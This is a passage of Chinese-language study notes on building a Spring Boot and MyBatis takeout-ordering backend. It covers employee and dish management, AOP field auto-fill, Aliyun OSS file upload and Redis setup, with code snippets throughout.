\u0026#39;\u0026#39;\u0026#34;\u0026gt; and name like concat(\u0026#39;%\u0026#39;,#{name},\u0026#39;%\u0026#39;) \u0026lt;/if\u0026gt; \u0026lt;/where\u0026gt; order by create_time desc \u0026lt;/select\u0026gt; \u0026lt;/mapper\u0026gt; 完善 日期显示格式有问题 方法一：在属性上加注解@JsonFormat(patter = \u0026quot;yyyy-MM-dd HH:mm:ss\u0026quot;) 方法二：在WebMvcConfiguration中扩展SpringMVC的消息转换器，统一对日期类型进行格式处理 消息转换器：\n当后端向前端返回 ResponseBody，或接收前端 RequestBody 时，会自动调用 1 2 3 4 5 6 7 8 9 10 11 12 13 /** * 扩展Spring MVC框架的消息转化器 * @param converters */ protected void extendMessageConverters(List\u0026lt;HttpMessageConverter\u0026lt;?\u0026gt;\u0026gt; converters) { log.info(\u0026#34;扩展消息转换器...\u0026#34;); //创建一个消息转换器对象 MappingJackson2HttpMessageConverter converter = new MappingJackson2HttpMessageConverter(); //需要为消息转换器设置一个对象转换器，对象转换器可以将Java对象序列化为json数据 converter.setObjectMapper(new JacksonObjectMapper()); //将自己的消息转化器加入容器中 converters.add(0,converter); } Json 对象映射器\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 package com.sky.json; import com.fasterxml.jackson.databind.DeserializationFeature; import com.fasterxml.jackson.databind.ObjectMapper; import com.fasterxml.jackson.databind.module.SimpleModule; import com.fasterxml.jackson.datatype.jsr310.deser.LocalDateDeserializer; import com.fasterxml.jackson.datatype.jsr310.deser.LocalDateTimeDeserializer; import com.fasterxml.jackson.datatype.jsr310.deser.LocalTimeDeserializer; import com.fasterxml.jackson.datatype.jsr310.ser.LocalDateSerializer; import com.fasterxml.jackson.datatype.jsr310.ser.LocalDateTimeSerializer; import com.fasterxml.jackson.datatype.jsr310.ser.LocalTimeSerializer; import java.time.LocalDate; import java.time.LocalDateTime; import java.time.LocalTime; import java.time.format.DateTimeFormatter; import static com.fasterxml.jackson.databind.DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES; /** * 对象映射器:基于jackson将Java对象转为json，或者将json转为Java对象 * 将JSON解析为Java对象的过程称为 [从JSON反序列化Java对象] * 从Java对象生成JSON的过程称为 [序列化Java对象到JSON] */ public class JacksonObjectMapper extends ObjectMapper { public static final String DEFAULT_DATE_FORMAT = \u0026#34;yyyy-MM-dd\u0026#34;; //public static final String DEFAULT_DATE_TIME_FORMAT = \u0026#34;yyyy-MM-dd HH:mm:ss\u0026#34;; public static final String DEFAULT_DATE_TIME_FORMAT = \u0026#34;yyyy-MM-dd HH:mm\u0026#34;; public static final String DEFAULT_TIME_FORMAT = \u0026#34;HH:mm:ss\u0026#34;; public JacksonObjectMapper() { super(); //收到未知属性时不报异常 this.configure(FAIL_ON_UNKNOWN_PROPERTIES, false); //反序列化时，属性不存在的兼容处理 this.getDeserializationConfig().withoutFeatures(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES); SimpleModule simpleModule = new SimpleModule() .addDeserializer(LocalDateTime.class, new LocalDateTimeDeserializer(DateTimeFormatter.ofPattern(DEFAULT_DATE_TIME_FORMAT))) .addDeserializer(LocalDate.class, new LocalDateDeserializer(DateTimeFormatter.ofPattern(DEFAULT_DATE_FORMAT))) .addDeserializer(LocalTime.class, new LocalTimeDeserializer(DateTimeFormatter.ofPattern(DEFAULT_TIME_FORMAT))) .addSerializer(LocalDateTime.class, new LocalDateTimeSerializer(DateTimeFormatter.ofPattern(DEFAULT_DATE_TIME_FORMAT))) .addSerializer(LocalDate.class, new LocalDateSerializer(DateTimeFormatter.ofPattern(DEFAULT_DATE_FORMAT))) .addSerializer(LocalTime.class, new LocalTimeSerializer(DateTimeFormatter.ofPattern(DEFAULT_TIME_FORMAT))); //注册功能模块 例如，可以添加自定义序列化器和反序列化器 this.registerModule(simpleModule); } } 启用、禁用 数据层处理：直接用 update 来更新！整合到一起\nController 注意接收路径参数、query 参数 1 2 3 4 5 6 7 @PostMapping(\u0026#34;/status/{status}\u0026#34;) @ApiOperation(\u0026#34;启用禁用员工账号\u0026#34;) public Result startOrStop(@PathVariable Integer status,Long id){ log.info(\u0026#34;启用禁用员工账号：{},{}\u0026#34;,status,id); employeeService.startOrStop(status,id);//后绪步骤定义 return Result.success(); } Service 1 2 3 4 5 6 7 8 public void startOrStop(Integer status, Long id) { Employee employee = Employee.builder() .status(status) .id(id) .build(); employeeMapper.update(employee); } Mapper .xml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;update id=\u0026#34;update\u0026#34; parameterType=\u0026#34;Employee\u0026#34;\u0026gt; update employee \u0026lt;set\u0026gt; \u0026lt;if test=\u0026#34;name != null\u0026#34;\u0026gt;name = #{name},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;username != null\u0026#34;\u0026gt;username = #{username},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;password != null\u0026#34;\u0026gt;password = #{password},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;phone != null\u0026#34;\u0026gt;phone = #{phone},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;sex != null\u0026#34;\u0026gt;sex = #{sex},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;idNumber != null\u0026#34;\u0026gt;id_Number = #{idNumber},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;updateTime != null\u0026#34;\u0026gt;update_Time = #{updateTime},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;updateUser != null\u0026#34;\u0026gt;update_User = #{updateUser},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;status != null\u0026#34;\u0026gt;status = #{status},\u0026lt;/if\u0026gt; \u0026lt;/set\u0026gt; where id = #{id} \u0026lt;/update\u0026gt; 编辑员工 根据 id 查询员工 Controller 1 2 3 4 5 6 @GetMapping(\u0026#34;/{id}\u0026#34;) @ApiOperation(\u0026#34;根据id查询员工信息\u0026#34;) public Result\u0026lt;Employee\u0026gt; getById(@PathVariable Long id){ Employee employee = employeeService.getById(id); return Result.success(employee); } Service 注意：密码回显前要隐藏！ 1 2 3 4 5 public Employee getById(Long id) { Employee employee = employeeMapper.getById(id); employee.setPassword(\u0026#34;****\u0026#34;); return employee; } Mapper 1 2 @Select(\u0026#34;select * from employee where id = #{id}\u0026#34;) Employee getById(Long id); 修改员工信息 直接用 update 将原来的覆盖即可\nController 注意方式为 Put！ 1 2 3 4 5 6 7 @PutMapping @ApiOperation(\u0026#34;编辑员工信息\u0026#34;) public Result update(@RequestBody EmployeeDTO employeeDTO){ log.info(\u0026#34;编辑员工信息：{}\u0026#34;, employeeDTO); employeeService.update(employeeDTO); return Result.success(); } Service 1 2 3 4 5 6 7 8 9 public void update(EmployeeDTO employeeDTO) { Employee employee = new Employee(); BeanUtils.copyProperties(employeeDTO, employee); employee.setUpdateTime(LocalDateTime.now()); employee.setUpdateUser(BaseContext.getCurrentId()); employeeMapper.update(employee); } Mapper 就是上面的 update 公共字段填充 抽取需要重复赋值的部分，如 setCreateTime(...) 等\n使用 AOP 编程！\n实现步骤：\n自定义注解 AutoFill，用于标识需要进行公共字段自动填充的方法\n自定义切面类 AutoFillAspect，统一拦截加入了 AutoFill 注解的方法，通过反射为公共字段赋值\n在 Mapper 的方法上加入 AutoFill 注解\n自定义注解 1 2 3 4 5 6 7 8 9 10 11 12 13 // sky-server/com.sky.annotation package com.sky.annotation; import ... /** * 自定义注解，用于标识某个方法需要进行功能字段自动填充处理 */ @Target(ElementType.METHOD) // 定义声明周期 @Retention(RetentionPolicy.RUNTIME) // 定义使用范围 public @interface AutoFill { //数据库操作类型：UPDATE INSERT OperationType value(); } 其中，OperationType 在 sky-common 中定义：\n1 2 3 4 5 6 7 8 package com.sky.enumeration; /** * 数据库操作类型 */ public enum OperationType { UPDATE, INSERT } 自定义切面 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 public void autoFill(JoinPoint joinPoint){ log.info(\u0026#34;开始进行公共字段自动填充...\u0026#34;); //获取到当前被拦截的方法上的数据库操作类型 MethodSignature signature = (MethodSignature) joinPoint.getSignature();//方法签名对象 AutoFill autoFill = signature.getMethod().getAnnotation(AutoFill.class);//获得方法上的注解对象 OperationType operationType = autoFill.value();//获得数据库操作类型 //获取到当前被拦截的方法的参数--实体对象 Object[] args = joinPoint.getArgs(); if(args == null || args.length == 0){ return; } Object entity = args[0]; //准备赋值的数据 LocalDateTime now = LocalDateTime.now(); Long currentId = BaseContext.getCurrentId(); //根据当前不同的操作类型，为对应的属性通过反射来赋值 if(operationType == OperationType.INSERT){ //为4个公共字段赋值 try { Method setCreateTime = entity.getClass().getDeclaredMethod(AutoFillConstant.SET_CREATE_TIME, LocalDateTime.class); Method setCreateUser = entity.getClass().getDeclaredMethod(AutoFillConstant.SET_CREATE_USER, Long.class); Method setUpdateTime = entity.getClass().getDeclaredMethod(AutoFillConstant.SET_UPDATE_TIME, LocalDateTime.class); Method setUpdateUser = entity.getClass().getDeclaredMethod(AutoFillConstant.SET_UPDATE_USER, Long.class); //通过反射为对象属性赋值 setCreateTime.invoke(entity,now); setCreateUser.invoke(entity,currentId); setUpdateTime.invoke(entity,now); setUpdateUser.invoke(entity,currentId); } catch (Exception e) { e.printStackTrace(); } }else if(operationType == OperationType.UPDATE){ //为2个公共字段赋值 try { Method setUpdateTime = entity.getClass().getDeclaredMethod(AutoFillConstant.SET_UPDATE_TIME, LocalDateTime.class); Method setUpdateUser = entity.getClass().getDeclaredMethod(AutoFillConstant.SET_UPDATE_USER, Long.class); //通过反射为对象属性赋值 setUpdateTime.invoke(entity,now); setUpdateUser.invoke(entity,currentId); } catch (Exception e) { e.printStackTrace(); } } } 菜品管理 文件上传的配置 实现图片的上传、多表操作\n文件上传 使用阿里云的 OSS 配置 application-dev.yml\n1 2 3 4 5 6 sky: alioss: endpoint: oss-cn-hangzhou.aliyuncs.com access-key-id: ... access-key-secret: ... bucket-name: sky-takeout-calendar application.yml\n1 2 3 4 5 6 7 8 9 spring: profiles: active: dev #设置环境 sky: alioss: endpoint: ${sky.alioss.endpoint} access-key-id: ${sky.alioss.access-key-id} access-key-secret: ${sky.alioss.access-key-secret} bucket-name: ${sky.alioss.bucket-name} 读取配置\n1 2 3 4 5 6 7 8 9 10 11 12 // sky-commom/com.sky.properties package com.sky.properties; @Component @ConfigurationProperties(prefix = \u0026#34;sky.alioss\u0026#34;) @Data public class AliOssProperties { private String endpoint; private String accessKeyId; private String accessKeySecret; private String bucketName; } 配置类，用于生成 OSS 工具类对象\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // sky-server/com.sky.config package com.sky.config; /** * 配置类，用于创建AliOssUtil对象 */ @Configuration @Slf4j public class OssConfiguration { @Bean @ConditionalOnMissingBean public AliOssUtil aliOssUtil(AliOssProperties aliOssProperties){ log.info(\u0026#34;开始创建阿里云文件上传工具类对象：{}\u0026#34;,aliOssProperties); return new AliOssUtil(aliOssProperties.getEndpoint(), aliOssProperties.getAccessKeyId(), aliOssProperties.getAccessKeySecret(), aliOssProperties.getBucketName()); } } AliOssUtil 在 sky-common 中定义\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 package com.sky.utils; @Data @AllArgsConstructor @Slf4j public class AliOssUtil { private String endpoint; private String accessKeyId; private String accessKeySecret; private String bucketName; /** * 文件上传 */ public String upload(byte[] bytes, String objectName) { // 创建OSSClient实例。 OSS ossClient = new OSSClientBuilder().build(endpoint, accessKeyId, accessKeySecret); try { // 创建PutObject请求。 ossClient.putObject(bucketName, objectName, new ByteArrayInputStream(bytes)); } catch (OSSException oe) { System.out.println(\u0026#34;Caught an OSSException, which means your request made it to OSS, \u0026#34; + \u0026#34;but was rejected with an error response for some reason.\u0026#34;); System.out.println(\u0026#34;Error Message:\u0026#34; + oe.getErrorMessage()); System.out.println(\u0026#34;Error Code:\u0026#34; + oe.getErrorCode()); System.out.println(\u0026#34;Request ID:\u0026#34; + oe.getRequestId()); System.out.println(\u0026#34;Host ID:\u0026#34; + oe.getHostId()); } catch (ClientException ce) { System.out.println(\u0026#34;Caught an ClientException, which means the client encountered \u0026#34; + \u0026#34;a serious internal problem while trying to communicate with OSS, \u0026#34; + \u0026#34;such as not being able to access the network.\u0026#34;); System.out.println(\u0026#34;Error Message:\u0026#34; + ce.getMessage()); } finally { if (ossClient != null) { ossClient.shutdown(); } } //文件访问路径规则 https://BucketName.Endpoint/ObjectName StringBuilder stringBuilder = new StringBuilder(\u0026#34;https://\u0026#34;); stringBuilder .append(bucketName) .append(\u0026#34;.\u0026#34;) .append(endpoint) .append(\u0026#34;/\u0026#34;) .append(objectName); log.info(\u0026#34;文件上传到:{}\u0026#34;, stringBuilder.toString()); return stringBuilder.toString(); } } 用 putobject 上传，然后捕获异常、回显上传路径\nCommonController 接口\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 package com.sky.controller.admin; /** * 通用接口 */ @RestController @RequestMapping(\u0026#34;/admin/common\u0026#34;) @Api(tags = \u0026#34;通用接口\u0026#34;) @Slf4j public class CommonController { @Autowired private AliOssUtil aliOssUtil; /** * 文件上传 * @param file * @return */ @PostMapping(\u0026#34;/upload\u0026#34;) @ApiOperation(\u0026#34;文件上传\u0026#34;) public Result\u0026lt;String\u0026gt; upload(MultipartFile file){ log.info(\u0026#34;文件上传：{}\u0026#34;,file); try { //原始文件名 String originalFilename = file.getOriginalFilename(); //截取原始文件名的后缀 dfdfdf.png String extension = originalFilename.substring(originalFilename.lastIndexOf(\u0026#34;.\u0026#34;)); //构造新文件名称 String objectName = UUID.randomUUID().toString() + extension; //文件的请求路径 String filePath = aliOssUtil.upload(file.getBytes(), objectName); return Result.success(filePath); } catch (IOException e) { log.error(\u0026#34;文件上传失败：{}\u0026#34;, e); } return Result.error(MessageConstant.UPLOAD_FAILED); } } 新增菜品 多表操作、批量添加的处理\nController 注意：注入的注解是 @RequiredArgsConstructor，且用 private final 1 2 3 4 5 6 7 8 @PostMapping @ApiOperation(\u0026#34;新增菜品\u0026#34;) public Result save(@RequestBody DishDTO dishDTO) { log.info(\u0026#34;新增菜品：{}\u0026#34;, dishDTO); dishService.saveWithFlavor(dishDTO);//后绪步骤开发 return Result.success(); } } Service 用事务解决同步性问题 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 package com.sky.service.impl; @Service @Slf4j public class DishServiceImpl implements DishService { @Autowired private DishMapper dishMapper; @Autowired private DishFlavorMapper dishFlavorMapper; /** * 新增菜品和对应的口味 * * @param dishDTO */ @Transactional public void saveWithFlavor(DishDTO dishDTO) { Dish dish = new Dish(); BeanUtils.copyProperties(dishDTO, dish); //向菜品表插入1条数据 dishMapper.insert(dish);//后绪步骤实现 //获取insert语句生成的主键值 Long dishId = dish.getId(); // ！！！批量插入数据 List\u0026lt;DishFlavor\u0026gt; flavors = dishDTO.getFlavors(); if (flavors != null \u0026amp;\u0026amp; flavors.size() \u0026gt; 0) { flavors.forEach(dishFlavor -\u0026gt; { dishFlavor.setDishId(dishId); }); //向口味表插入n条数据 dishFlavorMapper.insertBatch(flavors);//后绪步骤实现 } } } Mapper 主要看 insetBatch，用 foreach 遍历 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; ?\u0026gt; \u0026lt;!DOCTYPE mapper PUBLIC \u0026#34;-//mybatis.org//DTD Mapper 3.0//EN\u0026#34; \u0026#34;http://mybatis.org/dtd/mybatis-3-mapper.dtd\u0026#34; \u0026gt; \u0026lt;mapper namespace=\u0026#34;com.sky.mapper.DishFlavorMapper\u0026#34;\u0026gt; \u0026lt;insert id=\u0026#34;insertBatch\u0026#34;\u0026gt; insert into dish_flavor (dish_id, name, value) VALUES \u0026lt;foreach collection=\u0026#34;flavors\u0026#34; item=\u0026#34;df\u0026#34; separator=\u0026#34;,\u0026#34;\u0026gt; (#{df.dishId},#{df.name},#{df.value}) \u0026lt;/foreach\u0026gt; \u0026lt;/insert\u0026gt; \u0026lt;/mapper\u0026gt; 菜品分页查询 类似前面的分页查询，但是新增了多表查询\nController 1 2 3 4 5 6 7 @GetMapping(\u0026#34;/page\u0026#34;) @ApiOperation(value = \u0026#34;菜品分页查询\u0026#34;) public Result\u0026lt;PageResult\u0026gt; page(DishPageQueryDTO dishPageQueryDTO){ log.info(\u0026#34;菜品分页查询{}\u0026#34;,dishPageQueryDTO); PageResult pageResult = dishService.page(dishPageQueryDTO); return Result.success(pageResult); } Service 1 2 3 4 5 6 7 8 9 10 11 @Override public PageResult page(DishPageQueryDTO dishPageQueryDTO) { PageHelper.startPage(dishPageQueryDTO.getPage(),dishPageQueryDTO.getPageSize()); Page\u0026lt;DishVO\u0026gt; records = dishMapper.page(dishPageQueryDTO); Long total = records.getTotal(); List\u0026lt;DishVO\u0026gt; dishVOS = records.getResult(); PageResult pageResult = new PageResult(); pageResult.setTotal(total); pageResult.setRecords(dishVOS); return pageResult; } Mapper 注意多表查询 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;select id=\u0026#34;pageQuery\u0026#34; resultType=\u0026#34;com.sky.vo.DishVO\u0026#34;\u0026gt; select d.* , c.name as categoryName from dish d left outer join category c on d.category_id = c.id \u0026lt;where\u0026gt; \u0026lt;if test=\u0026#34;name != null\u0026#34;\u0026gt; and d.name like concat(\u0026#39;%\u0026#39;,#{name},\u0026#39;%\u0026#39;) \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;categoryId != null\u0026#34;\u0026gt; and d.category_id = #{categoryId} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;status != null\u0026#34;\u0026gt; and d.status = #{status} \u0026lt;/if\u0026gt; \u0026lt;/where\u0026gt; order by d.create_time desc \u0026lt;/select\u0026gt; 删除菜品 涉及较复杂的多表关联删除操作\n业务规则：\n可以一次删除一个菜品，也可以批量删除菜品 起售中的菜品不能删除 被套餐关联的菜品不能删除 删除菜品后，关联的口味数据也需要删除掉 菜品的返回需要包装一个 VO 类\nController 1 2 3 4 5 6 7 @DeleteMapping @ApiOperation(\u0026#34;菜品批量删除\u0026#34;) public Result delete(@RequestParam List\u0026lt;Long\u0026gt; ids) { log.info(\u0026#34;菜品批量删除：{}\u0026#34;, ids); dishService.deleteBatch(ids);//后绪步骤实现 return Result.success(); } Service 注意判断逻辑 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 @Transactional//事务 public void deleteBatch(List\u0026lt;Long\u0026gt; ids) { //判断当前菜品是否能够删除---是否存在起售中的菜品？？ for (Long id : ids) { Dish dish = dishMapper.getById(id);//后绪步骤实现 if (dish.getStatus() == StatusConstant.ENABLE) { //当前菜品处于起售中，不能删除 throw new DeletionNotAllowedException(MessageConstant.DISH_ON_SALE); } } //判断当前菜品是否能够删除---是否被套餐关联了？？ List\u0026lt;Long\u0026gt; setmealIds = setmealDishMapper.getSetmealIdsByDishIds(ids); if (setmealIds != null \u0026amp;\u0026amp; setmealIds.size() \u0026gt; 0) { //当前菜品被套餐关联了，不能删除 throw new DeletionNotAllowedException(MessageConstant.DISH_BE_RELATED_BY_SETMEAL); } //删除菜品表中的菜品数据 for (Long id : ids) { dishMapper.deleteById(id);//后绪步骤实现 //删除菜品关联的口味数据 dishFlavorMapper.deleteByDishId(id);//后绪步骤实现 } } Mapper 注意删除多个 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; ?\u0026gt; \u0026lt;!DOCTYPE mapper PUBLIC \u0026#34;-//mybatis.org//DTD Mapper 3.0//EN\u0026#34; \u0026#34;http://mybatis.org/dtd/mybatis-3-mapper.dtd\u0026#34; \u0026gt; \u0026lt;mapper namespace=\u0026#34;com.sky.mapper.SetmealDishMapper\u0026#34;\u0026gt; \u0026lt;select id=\u0026#34;getSetmealIdsByDishIds\u0026#34; resultType=\u0026#34;java.lang.Long\u0026#34;\u0026gt; select setmeal_id from setmeal_dish where dish_id in \u0026lt;foreach collection=\u0026#34;dishIds\u0026#34; item=\u0026#34;dishId\u0026#34; separator=\u0026#34;,\u0026#34; open=\u0026#34;(\u0026#34; close=\u0026#34;)\u0026#34;\u0026gt; #{dishId} \u0026lt;/foreach\u0026gt; \u0026lt;/select\u0026gt; \u0026lt;/mapper\u0026gt; 异常类编写：\n1 2 3 4 5 6 7 package com.sky.exception; public class DeletionNotAllowedException extends BaseException { public DeletionNotAllowedException(String msg) { super(msg); } } 修改菜品 查询 需要将 flavor 也添加进去 \u0026ndash;\u0026gt; 需要新的 VO 来存储\nController 1 2 3 4 5 6 7 @GetMapping(\u0026#34;/{id}\u0026#34;) @ApiOperation(\u0026#34;根据id查询菜品\u0026#34;) public Result\u0026lt;DishVO\u0026gt; getById(@PathVariable Long id) { log.info(\u0026#34;根据id查询菜品：{}\u0026#34;, id); DishVO dishVO = dishService.getByIdWithFlavor(id);//后绪步骤实现 return Result.success(dishVO); } Service 1 2 3 4 5 6 7 8 9 10 11 12 13 14 public DishVO getByIdWithFlavor(Long id) { //根据id查询菜品数据 Dish dish = dishMapper.getById(id); //根据菜品id查询口味数据 List\u0026lt;DishFlavor\u0026gt; dishFlavors = dishFlavorMapper.getByDishId(id);//后绪步骤实现 //将查询到的数据封装到VO DishVO dishVO = new DishVO(); BeanUtils.copyProperties(dish, dishVO); dishVO.setFlavors(dishFlavors); return dishVO; } Mapper 1 2 @Select(\u0026#34;select * from dish_flavor where dish_id = #{dishId}\u0026#34;) List\u0026lt;DishFlavor\u0026gt; getByDishId(Long dishId); 修改 Controller 1 2 3 4 5 6 7 @PutMapping @ApiOperation(\u0026#34;修改菜品\u0026#34;) public Result update(@RequestBody DishDTO dishDTO) { log.info(\u0026#34;修改菜品：{}\u0026#34;, dishDTO); dishService.updateWithFlavor(dishDTO); return Result.success(); } Service 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public void updateWithFlavor(DishDTO dishDTO) { Dish dish = new Dish(); BeanUtils.copyProperties(dishDTO, dish); //修改菜品表基本信息 dishMapper.update(dish); //删除原有的口味数据 dishFlavorMapper.deleteByDishId(dishDTO.getId()); //重新插入口味数据 List\u0026lt;DishFlavor\u0026gt; flavors = dishDTO.getFlavors(); if (flavors != null \u0026amp;\u0026amp; flavors.size() \u0026gt; 0) { flavors.forEach(dishFlavor -\u0026gt; { dishFlavor.setDishId(dishDTO.getId()); }); //向口味表插入n条数据 dishFlavorMapper.insertBatch(flavors); } } Mapper 注意更新的编写，if test 标签 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;update id=\u0026#34;update\u0026#34;\u0026gt; update dish \u0026lt;set\u0026gt; \u0026lt;if test=\u0026#34;name != null\u0026#34;\u0026gt;name = #{name},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;categoryId != null\u0026#34;\u0026gt;category_id = #{categoryId},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;price != null\u0026#34;\u0026gt;price = #{price},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;image != null\u0026#34;\u0026gt;image = #{image},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;description != null\u0026#34;\u0026gt;description = #{description},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;status != null\u0026#34;\u0026gt;status = #{status},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;updateTime != null\u0026#34;\u0026gt;update_time = #{updateTime},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;updateUser != null\u0026#34;\u0026gt;update_user = #{updateUser},\u0026lt;/if\u0026gt; \u0026lt;/set\u0026gt; where id = #{id} \u0026lt;/update\u0026gt; 套餐管理 新增套餐 首先需要新增根据套餐类型查询菜品，回显 注意返回值！ 1 2 3 4 5 6 7 8 // DishController @GetMapping(\u0026#34;/list\u0026#34;) @ApiOperation(value = \u0026#34;根据分类id查询菜品\u0026#34;) public Result\u0026lt;List\u0026lt;DishVO\u0026gt;\u0026gt; getByCategoryId(@RequestParam Long categoryId){ log.info(\u0026#34;根据分类id查询菜品{}\u0026#34;,categoryId); List\u0026lt;DishVO\u0026gt; dishVOS = dishService.getByCategoryId(categoryId); return Result.success(dishVOS); } 然后正常添加 setmeal 的 insert 即可 套餐分页查询 类似地，多了参数，多写几个 if test 就可以了\n注意，Page\u0026lt;Setmeal\u0026gt; records = setmealMapper.pageQuerySetmeal(setmealPageQueryDTO);，返回的不是 page 对象…… 删除套餐 sql 不会写： 接收参数要用 @RequestParam List\u0026lt;Long\u0026gt; ids 绑定参数、参数可选、数组参数 1 2 3 4 5 6 \u0026lt;delete id=\u0026#34;deleteSetmeals\u0026#34;\u0026gt; delete from setmeal where id in \u0026lt;foreach collection=\u0026#34;ids\u0026#34; item=\u0026#34;id\u0026#34; open=\u0026#34;(\u0026#34; close=\u0026#34;)\u0026#34; separator=\u0026#34;,\u0026#34;\u0026gt; #{id} \u0026lt;/foreach\u0026gt; \u0026lt;/delete\u0026gt; 修改套餐 update 语句还不太会写\n参数还是要用 @RequestBody 接收\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;update id=\u0026#34;update\u0026#34;\u0026gt; update setmeal \u0026lt;set\u0026gt; \u0026lt;if test=\u0026#34;categoryId != null\u0026#34;\u0026gt;category_id = #{categoryId},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;description != null and description != \u0026#39;\u0026#39;\u0026#34;\u0026gt;description = #{description},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;image != null and image != \u0026#39;\u0026#39;\u0026#34;\u0026gt;image = #{image},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;name != null and name != \u0026#39;\u0026#39;\u0026#34;\u0026gt;name = #{name},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;price != null\u0026#34;\u0026gt;price = #{price},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;status != null\u0026#34;\u0026gt;status = #{status},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;updateTime != null\u0026#34;\u0026gt;update_time = #{updateTime},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;updateUser != null\u0026#34;\u0026gt;update_user = #{updateUser}\u0026lt;/if\u0026gt; \u0026lt;/set\u0026gt; where id = #{id} \u0026lt;/update\u0026gt; 启用、禁用套餐 没什么问题\nRedis - 店铺营业状态 docker 部署\n1 2 3 4 5 6 7 docker run -d \\ --name redis-4.0.0 \\ -p 6379:6379 \\ -v /root/docker/redis/data:/data \\ -v /root/docker/redis/conf/redis.conf:/etc/redis/redis.conf \\ redis:4.0.0 \\ redis-server /etc/redis/redis.conf Spring Data Redis 的使用 配置 导入maven坐标 1 2 3 4 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-data-redis\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 配置 dev.yml,并导入到 application.tml 中 1 2 3 4 5 6 7 8 spring: profiles: active: dev redis: host: ${sky.redis.host} port: ${sky.redis.port} password: ${sky.redis.password} database: ${sky.redis.database} 配置类 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package com.sky.config; @Configuration @Slf4j public class RedisConfiguration { @Bean public RedisTemplate redisTemplate(RedisConnectionFactory redisConnectionFactory){ log.info(\u0026#34;开始创建redis模板对象...\u0026#34;); RedisTemplate redisTemplate = new RedisTemplate(); //设置redis的连接工厂对象 redisTemplate.setConnectionFactory(redisConnectionFactory); //设置redis key的序列化器 redisTemplate.setKeySerializer(new StringRedisSerializer()); return redisTemplate; } } Spring Boot 内置了 RedisAutoConfiguration 自动配置类，会根据 application.yml 中的 spring.redis 前缀配置，自动创建 RedisConnectionFactory 实例\n当前配置类不是必须的，因为 Spring Boot 框架会自动装配 RedisTemplate 对象，但是默认的key序列化器为 JdkSerializationRedisSerializer，导致我们存到 Redis 中后的数据和原始数据有差别，故设置为 StringRedisSerializer 序列化器。\n通过配置类操作 Redis 字符串型 1 2 3 4 5 6 7 8 9 10 11 12 /** * 操作字符串类型的数据 */ public void testString(){ // set get setex setnx redisTemplate.opsForValue().set(\u0026#34;name\u0026#34;,\u0026#34;小明\u0026#34;); String city = (String) redisTemplate.opsForValue().get(\u0026#34;name\u0026#34;); System.out.println(city); redisTemplate.opsForValue().set(\u0026#34;code\u0026#34;,\u0026#34;1234\u0026#34;,3, TimeUnit.MINUTES); redisTemplate.opsForValue().setIfAbsent(\u0026#34;lock\u0026#34;,\u0026#34;1\u0026#34;); redisTemplate.opsForValue().setIfAbsent(\u0026#34;lock\u0026#34;,\u0026#34;2\u0026#34;); } 哈希型 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 /** * 操作哈希类型的数据 */ public void testHash(){ //hset hget hdel hkeys hvals HashOperations hashOperations = redisTemplate.opsForHash(); 